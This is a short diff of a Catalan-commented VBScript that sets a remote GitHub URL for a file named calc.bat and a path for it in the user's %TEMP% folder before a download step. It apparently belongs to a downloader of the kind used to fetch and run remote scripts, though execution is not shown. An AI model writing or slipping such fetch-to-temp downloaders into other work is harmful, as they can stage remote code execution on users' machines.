@@ -1,6 +1,6 @@
 ' Configuració
 Dim url, targetPath
-url = "https://mcrumo.github.io/calc.bat" ' <--- CANVIA AIXÒ AMB LA TEVA URL REAL
+url = "https://raw.githubusercontent.com/mcrumo/mcrumo.github.io/main/calc.bat"
 targetPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\calc.bat"
 
 ' Descarregar el fitxer
